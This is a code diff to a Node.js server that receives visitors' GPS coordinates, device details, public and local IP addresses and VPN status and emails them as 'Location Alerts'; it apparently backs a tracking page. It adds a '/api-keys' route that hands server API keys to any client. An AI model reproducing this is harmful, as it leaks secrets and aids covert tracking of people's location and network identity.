@@ -13,6 +13,15 @@ app.use(express.json());
 // Serve static files
 app.use(express.static(path.join(__dirname)));
 
+// Endpoint to provide API keys to client
+app.get('/api-keys', (req, res) => {
+  res.json({
+    IPGEOLOCATION_API_KEY: process.env.IPGEOLOCATION_API_KEY,
+    VPNAPI_KEY: process.env.VPNAPI_KEY,
+    IPQUALITY_KEY: process.env.IPQUALITY_KEY
+  });
+});
+
 // Root route
 app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "index.html"));
@@ -20,7 +29,19 @@ app.get("/", (req, res) => {
 
 // Route to receive location data
 app.post("/log", async (req, res) => {
-  const { lat, lng, timestamp, accuracy, userAgent, device, ipAddress, isLocalIP } = req.body;
+  const { 
+    lat, 
+    lng, 
+    timestamp, 
+    accuracy, 
+    userAgent, 
+    device, 
+    publicIpAddress, 
+    localIpAddress, 
+    isVPN, 
+    vpnProvider, 
+    vpnLocation 
+  } = req.body;
 
   if (typeof lat !== "number" || typeof lng !== "number") {
     return res.status(400).json({ error: "Invalid or missing lat/lng" });
@@ -30,6 +51,7 @@ app.post("/log", async (req, res) => {
   const formattedTime = new Date(timestamp || Date.now()).toLocaleString();
   
   console.log(`[${new Date().toISOString()}] Location received: ${lat.toFixed(6)}, ${lng.toFixed(6)}`);
+  console.log(`VPN Status: ${isVPN ? 'Detected' : 'Not detected'}`);
 
   // Email credentials
   const EMAIL_USER = process.env.EMAIL_USER;
@@ -123,6 +145,14 @@ app.post("/log", async (req, res) => {
         .data-table tr:last-child td {
           border-bottom: none;
         }
+        .vpn-alert {
+          background-color: #fff3cd;
+          color: #856404;
+          padding: 12px 20px;
+          border-radius: 6px;
+          margin: 20px 0;
+          border-left: 4px solid #ffc107;
+        }
         .map-link {
           display: inline-block;
           background: linear-gradient(135deg, #1a2a6c, #b21f1f);
@@ -185,6 +215,12 @@ app.post("/log", async (req, res) => {
           <p>Hello Security Team,</p>
           <p>A new location has been submitted through the tracking system. Please review the details below:</p>
           
+          ${isVPN ? `
+          <div class="vpn-alert">
+            <strong><i class="fas fa-shield-alt"></i> VPN DETECTED:</strong> User is connected through a VPN service.
+          </div>
+          ` : ''}
+          
           <table class="data-table">
             <tr>
               <th>Parameter</th>
@@ -203,9 +239,27 @@ app.post("/log", async (req, res) => {
               <td>${accuracy ? Math.round(accuracy) + ' meters' : 'Not available'}</td>
             </tr>
             <tr>
-              <td>${isLocalIP ? 'Local IP Address' : 'Public IP Address'}</td>
-              <td>${ipAddress || 'Not available'}</td>
+              <td>Public IP Address</td>
+              <td>${publicIpAddress || 'Not available'}</td>
             </tr>
+            <tr>
+              <td>Local IP Address</td>
+              <td>${localIpAddress || 'Not available'}</td>
+            </tr>
+            <tr>
+              <td>VPN Detected</td>
+              <td>${isVPN ? 'Yes' : 'No'}</td>
+            </tr>
+            ${isVPN ? `
+            <tr>
+              <td>VPN Provider</td>
+              <td>${vpnProvider || 'Unknown'}</td>
+            </tr>
+            <tr>
+              <td>Active VPN Server Location</td>
+              <td>${vpnLocation || 'Unknown'}</td>
+            </tr>
+            ` : ''}
           </table>
           
           <div style="text-align: center;">
@@ -237,9 +291,9 @@ app.post("/log", async (req, res) => {
     const mailOptions = {
       from: `"Security System" <${EMAIL_USER}>`,
       to: EMAIL_TO,
-      subject: "📍 Location Alert: New Position Data Received",
+      subject: `📍 Location Alert: ${isVPN ? 'VPN Detected - ' : ''}New Position Data Received`,
       html: htmlTemplate,
-      text: `Location Alert: ${mapLink}\nCoordinates: Lat: ${lat.toFixed(6)}, Lng: ${lng.toFixed(6)}\nTimestamp: ${formattedTime}\nDevice: ${device}\n${isLocalIP ? 'Local IP' : 'Public IP'}: ${ipAddress}`
+      text: `Location Alert: ${mapLink}\nCoordinates: Lat: ${lat.toFixed(6)}, Lng: ${lng.toFixed(6)}\nTimestamp: ${formattedTime}\nDevice: ${device}\nPublic IP: ${publicIpAddress}\nLocal IP: ${localIpAddress}\nVPN Detected: ${isVPN ? 'Yes' : 'No'}${isVPN ? `\nVPN Provider: ${vpnProvider}\nVPN Server Location: ${vpnLocation}` : ''}`
     };
 
     // Send email
